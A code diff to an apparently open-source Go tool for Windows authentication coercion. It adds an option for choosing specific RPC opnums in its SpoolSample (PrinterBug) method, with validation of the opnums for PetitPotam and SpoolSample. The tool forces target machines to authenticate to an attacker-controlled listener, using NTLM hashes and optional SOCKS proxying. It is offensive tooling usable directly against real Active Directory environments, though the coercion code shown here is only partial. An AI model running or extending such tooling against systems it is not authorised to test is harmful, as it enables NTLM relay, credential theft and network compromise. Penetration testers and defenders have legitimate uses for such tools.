@@ -160,7 +160,7 @@ func main() {
 	cli.Flag(&hash, "H", "hash", "", "NTLM hash (32 hex characters)")
 	cli.Flag(&method, "m", "method", "petitpotam", "Coercion method: petitpotam, spoolsample, shadowcoerce, dfscoerce")
 	cli.Flag(&pipe, "pipe", "efsrpc", "Named pipe (petitpotam only): efsrpc (universal - 1 callback on Win11/2025, 3 on Win10/2022), lsarpc (legacy), samr, netlogon, lsass")
-	cli.Flag(&opnum, "opnum", -1, "Test specific opnum only (petitpotam only): 0, 4, 5, 6, 7, 12. Default: try all")
+	cli.Flag(&opnum, "opnum", -1, "Test specific opnum only. Default: try all. PetitPotam: 0, 4, 5, 6, 7, 12. SpoolSample: 62, 65")
 	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)")
 	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
 
@@ -229,6 +229,42 @@ func main() {
 	// Warn if pipe is specified but method doesn't use it
 	if pipe != "lsarpc" && method != "petitpotam" {
 		fmt.Printf("[!] Warning: --pipe parameter only applies to 'petitpotam' method (ignored for %s)\n", method)
+	}
+
+	// Validate opnum if specified
+	if opnum >= 0 {
+		validOpnums := map[string][]int{
+			"petitpotam":   {0, 4, 5, 6, 7, 12},
+			"spoolsample":  {62, 65},
+			"shadowcoerce": {}, // opnum not supported
+			"dfscoerce":    {}, // opnum not supported
+		}
+
+		methodOpnums, methodSupported := validOpnums[method]
+		if !methodSupported || len(methodOpnums) == 0 {
+			fmt.Printf("[!] Error: --opnum parameter is not supported for method '%s'\n", method)
+			fmt.Println("[!] --opnum only works with: petitpotam, spoolsample")
+			os.Exit(1)
+		}
+
+		// Check if opnum is valid for this method
+		validForMethod := false
+		for _, validOp := range methodOpnums {
+			if opnum == validOp {
+				validForMethod = true
+				break
+			}
+		}
+
+		if !validForMethod {
+			fmt.Printf("[!] Error: Invalid opnum %d for method '%s'\n", opnum, method)
+			if method == "petitpotam" {
+				fmt.Println("[!] Valid opnums for PetitPotam: 0, 4, 5, 6, 7, 12")
+			} else if method == "spoolsample" {
+				fmt.Println("[!] Valid opnums for SpoolSample: 62, 65")
+			}
+			os.Exit(1)
+		}
 	}
 
 	// Validate proxy URL format if provided
@@ -365,7 +401,7 @@ func main() {
 		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
 		}
-		err = executeSpoolSample(session, share, auth, listener, target)
+		err = executeSpoolSample(session, share, auth, listener, target, opnum)
 	case "shadowcoerce":
 		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for ShadowCoerce (only works on \\pipe\\FssagentRpc)")
@@ -549,18 +585,28 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 
 // executeSpoolSample implements the SpoolSample/PrinterBug coercion technique (MS-RPRN)
 // This uses the Print Spooler service to coerce authentication
-func executeSpoolSample(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, targetIP string) error {
+func executeSpoolSample(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, targetIP string, specificOpnum int) error {
 	fmt.Printf("[*] Using SpoolSample coercion technique via \\pipe\\spoolss\n")
 
 	// Define SpoolSample method parameters
+	var opnums []uint16
+	if specificOpnum >= 0 {
+		// Test only specified opnum
+		fmt.Printf("[*] Testing ONLY opnum %d\n", specificOpnum)
+		opnums = []uint16{uint16(specificOpnum)}
+	} else {
+		// Test all opnums (default: 65 and 62)
+		opnums = []uint16{65, 62} // RpcRemoteFindFirstPrinterChangeNotificationEx (65), RpcRemoteFindFirstPrinterChangeNotification (62)
+	}
+
 	method := CoercionMethod{
 		Name:         "SpoolSample",
 		PipeName:     "spoolss",
 		UUID:         "12345678-1234-abcd-ef00-0123456789ab",
 		MajorVersion: 1,
 		MinorVersion: 0,
-		Opnums:       []uint16{65, 62}, // RpcRemoteFindFirstPrinterChangeNotificationEx (65), RpcRemoteFindFirstPrinterChangeNotification (62)
-		CreateStub:   nil,              // Will use custom logic below
+		Opnums:       opnums,
+		CreateStub:   nil, // Will use custom logic below
 	}
 
 	// Open named pipe with read+write access
